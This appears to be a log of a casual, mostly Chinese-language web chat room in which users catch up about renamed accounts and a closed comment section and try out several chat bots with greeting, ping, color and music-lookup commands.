+欸
+
+23:05:33 Bird
+对
+
+23:05:33 Chumo_LineageOS17
+就你那个垃圾识别码
+
+23:05:35 Light
+我好像也听说过这个人
+
+23:05:41 Chumo_LineageOS17
+我都猜到过一次
+
+23:05:44 ccw
+（我是-=，改名了）
+
+23:05:44 eeeebot
+（我是-=，改名了）
+
+23:05:49 Bird
+我擦
+
+23:05:57 Light
+啊啊啊啊啊啊啊啊啊啊啊啊
+
+23:06:01 Light
+妈妈别
+
+23:06:01 eeeebot
+@Bird Bird?
+
+23:06:01 Bird
+现在noi评论区都被关了
+
+23:06:12 Chumo_LineageOS17
+我是[数据删除]，改名了
+
+23:06:26 Bird
+之前他们把评论区搞得乌烟瘴气
+
+23:06:36 hh
+我的母亲来制裁我了
+
+23:06:39 Bird
+结果估计是被管理员看到了
+
+23:06:40 Light
+打开笔记本
+
+23:06:44 Bird
+给关了
+
+23:06:50 ccw
+盲猜是接多次关于某人关于一些不好东西的宣传举报然后被网警督促关了吧
+
+23:06:51 Bird
+@ccw 
+
+23:06:51 eee
+混乱的局面
+
+23:06:55 Light
+woc，这tm60年代的笔记本
+
+23:06:57 Bird
+嗯
+
+23:07:00 Light
+开机要10几分钟
+
+23:07:04 ccw
+管理员多少年没管了
+
+23:07:13 Bird
+-=怎么来这了
+
+23:07:19 hh
+我要去逝了bye
+
+23:07:19 eeeebot
+我要去逝了bye
+
+23:07:20 Chumo_LineageOS17
+@Light 戴尔服务器表示不服
+
+23:07:31 Chumo_LineageOS17
+开机15分钟
+
+23:07:56 ccw
+我一直都在这吧
+
+23:08:03 Chumo_LineageOS17
+光是引导+固件就能给你加载10分钟
+
+23:08:19 Bird
+我前段时间来就几个外国人
+
+23:08:21 ccw
+上次的emankciN你不会不知道是我吧……
+
+23:08:26 Light
+啊啊啊啊啊啊阿
+
+23:08:42 Light
+算了
+
+23:08:54 Chumo_LineageOS17
+@Light 让我来
+
+23:08:59 eee
+接着写eebot√
+
+23:09:00 Chumo_LineageOS17
+nmsl
+
+23:09:06 Light
+明知道逃不过
+
+23:09:07 Bird
+emankicN在哪
+
+23:09:11 Light
+算了我先睡一觉吧
+
+23:09:12 eeeebot
+算了
+
+23:09:14 Light
+百变
+
+23:09:20 Chumo_LineageOS17
+--全剧终--
+
+23:09:23 Bird
+lbwnb!
+
+23:09:34 Chumo_LineageOS17
+。。。？
+
+23:09:42 Chumo_LineageOS17
+不至于不至于
+
+23:09:52 ccw
+就在这啊
+
+23:09:59 Bird
+那个ee?
+
+23:10:06 Bird
+@eee 
+
+23:10:11 Bird
+这个？
+
+23:10:14 ccw
+不不不
+
+23:10:15 eeeebot
+不不不
+
+23:10:20 Bird
+那是哪个
+
+23:10:23 ccw
+我之前在这里就叫emankciN
+
+23:10:23 eee
+我是ee
+
+23:10:27 eee
+ccw是eman
+
+23:10:30 Bird
+。
+
+23:10:32 bo_od
+hi
+
+23:10:33 eeeebot
+hi Chumo
+
+23:10:43 bo_od
+Chumo棒棒
+
+23:10:45 ccw
+后来改名叫clearcoldwater（你应该知道这道题
+
+23:10:52 Bird
+这人我好像在hc见过
+
+23:10:59 Bird
+初墨好像是
+
+23:11:05 Chumo
+@Light 代码发给我
+
+23:11:08 ccw
+......
+
+23:11:13 eee
+Light left
+
+23:11:13 eeeebot
+。
+
+23:11:16 Chumo
+我子系统隔离措施已经做好了
+
+23:11:20 ccw
+emankciN,ccw都是我-=
+
+23:11:31 Bird
+-=
+
+23:11:43 Bird
+你还记得那个宋*轩吗
+
+23:11:48 Chumo
+。。？
+
+23:11:51 ccw
+记得——
+
+23:11:58 Bird
+他人自从19年到20年就失踪了
+
+23:12:10 Bird
+后来再也没见过他了
+
+23:12:35 Bird
+那现在评论区没了大家都在哪聊天呢
+
+23:13:00 ccw
+应该只是暂时关停吧但是
+
+23:13:23 Bird
+具体什么时候关的啊
+
+23:13:44 ccw
+一两个星期前吧
+
+23:36:43 bo_od
+hi
+
+23:36:43 eeeebot
+hi kim
+
+23:39:36 bo_od
+hi
+
+23:39:36 eeeebot
+hi xman5566
+
+23:39:36 eeeebot
+hi
+
+23:39:47 xman5566
+Hi
+
+23:40:12 bo_od
+hi
+
+23:40:12 eeeebot
+hey Edboy2
+
+23:40:15 Edboy2
+Hello
+
+23:40:30 Edboy2
+Kevin Mitnick
+
+23:41:49 xman5566
+就是打个招呼吗？
+
+23:46:19 Edboy2
+https://www.facebook.com/photo/?fbid=481761453291768&set=a.125867512214499
+
+23:46:20 bo_od
+@Edboy2 推荐了网页:[Facebook](https://www.facebook.com/photo/?fbid=481761453291768&set=a.125867512214499)
+
+23:46:20 bo_od
+Oops~ @bo_od又出bug啦!~[点击查看错误信息](https://cdn.mrpig.cf/traceback/1646495182926924.log)
+
+23:47:16 Edboy2
+https://www.tiktok.com/foryou?is_copy_url=1&is_from_webapp=v1
+
+23:47:20 bo_od
+@Edboy2 推荐了网页:[Watch trending videos for you | TikTok](https://www.tiktok.com/foryou?is_copy_url=1&is_from_webapp=v1)
+
+23:47:21 bo_od
+Oops~ @bo_od又出bug啦!~[点击查看错误信息](https://cdn.mrpig.cf/traceback/1646495243780721.log)
+
+23:49:10 eee
+wuhu
+
+23:49:11 eeeebot
+·
+「刺客信条：王朝」
+类型：游戏 中国漫画
+标签：冒险 历史 武侠
+推荐：L
+
+23:49:24 Edboy2
+Hiiiiiii
+
+23:49:47 eee
+eebot也可以像bo_od那样ping了
+
+23:49:54 eee
+hi
+
+23:50:26 bo_od
+hi
+
+23:50:26 bo_od
+hi
+
+23:50:26 eebot
+hi this is eebot (o°ω°o)
+
+23:50:26 eebot
+想了解更多玩法 请输入「功能」
+
+23:50:26 eeeebot
+hello eebot
+
+23:50:27 eebot
+hey bo_od
+
+23:50:27 eebot
+hi this is eebot (o°ω°o)
+
+23:50:27 eebot
+想了解更多玩法 请输入「功能」
+
+23:50:27 eeeebot
+hello eebot
+
+23:50:27 eebot
+hey bo_od
+
+23:50:36 eee
+ping paperee.tk
+
+23:50:36 eee
+ping paperee.tk
+
+23:50:37 eebot
+·
+paperee.tk（76.223.125.78）
+·
+最快用时：50.467ms
+最慢用时：58.664ms
+
+23:50:37 eebot
+·
+paperee.tk（76.223.125.78）
+·
+最快用时：50.467ms
+最慢用时：58.664ms
+
+23:50:38 bo_od
+最短用时:  50.823ms, 最长用时: 56.626ms
+
+23:50:38 bo_od
+最短用时:  50.823ms, 最长用时: 56.626ms
+
+23:52:45 bo_od
+hi
+
+23:52:45 bo_od
+hi
+
+23:52:45 eebot
+hey haisenbery
+
+23:52:45 eeeebot
+hi haisenbery
+
+23:52:45 eebot
+hey haisenbery
+
+23:52:45 eeeebot
+hi haisenbery
+
+23:53:08 eee
+color
+
+23:53:13 haisenbery
+hi
+
+23:53:13 haisenbery
+hi
+
+23:53:13 eeeebot
+hi
+
+23:53:46 haisenbery
+how many people is here 
+
+23:53:46 haisenbery
+how many people is here 
+
+23:53:54 Edboy2
+Hiiiii
+
+23:53:54 Edboy2
+Hiiiii
+
+23:53:56 Edboy2
+Fuckyouuu
+
+23:53:56 Edboy2
+Fuckyouuu
+
+23:54:03 Edboy2
+HAHAHAHA
+
+23:54:04 Edboy2
+HAHAHAHA
+
+23:54:27 haisenbery
+o
+
+23:54:27 haisenbery
+o
+
+23:54:30 eee
+color
+
+23:54:30 eee
+color
+
+23:54:51 haisenbery
+color
+
+23:56:05 bo_od
+hi
+
+23:56:05 eebot
+hi this is eebot (o°ω°o)
+
+23:56:05 eeeebot
+eebot is back
+
+23:56:05 bo_od
+hi
+
+23:56:05 eebot
+想了解更多玩法 请输入「功能」
+
+23:56:05 eebot
+hello bo_od
+
+23:56:05 eebot
+hi this is eebot (o°ω°o)
+
+23:56:05 eeeebot
+eebot is back
+
+23:56:05 eebot
+想了解更多玩法 请输入「功能」
+
+23:56:05 eebot
+hello bo_od
+
+23:56:08 eee
+color
+
+23:56:08 eee
+color
+
+23:56:18 eee
+ohhhhh
+
+23:56:20 eee
+ohhhhh
+
+23:56:26 eee
+se.text
+
+23:56:26 eee
+se.text
+
+23:57:14 bo_od
+hi
+
+23:57:14 eebot
+hi this is eebot (o°ω°o)
+
+23:57:14 eebot
+想了解更多玩法 请输入「功能」
+
+23:57:14 eebot
+hello bo_od
+
+23:57:18 eee
+color
+
+23:57:19 eebot
+This Color: #57FA76
+Old Color: #44FF00
+
+23:57:23 eee
+color
+
+23:57:23 eebot
+This Color: #DC4C4B
+Old Color: #44FF00
+
+23:58:22 haisenbery
+sfasd 
+
+23:58:31 haisenbery
+sfasdf
+
+23:58:31 bo_od
+haisenbery棒棒
+
+23:58:41 eee
+yeah
+
+23:58:50 haisenbery
+asdfasdf
+
+23:59:14 bo_od
+hi
+
+23:59:14 eebot
+hi this is eebot (o°ω°o)
+
+23:59:14 eebot
+想了解更多玩法 请输入「功能」
+
+23:59:14 eebot
+hey bo_od
+
+23:59:20 eee
+id 277382
+
+23:59:25 eebot
+http://m10.music.126.net/20220306002423/8c50ede96ace09b62124f418c988dcab/ymusic/5c15/bbf4/8e35/6040c150fa65ba5a70e4dfd3764281db.mp3
+
+23:59:53 eee
+wow
+
+23:59:58 bo_od
+Sun Mar  6 00:00:00 2022
+
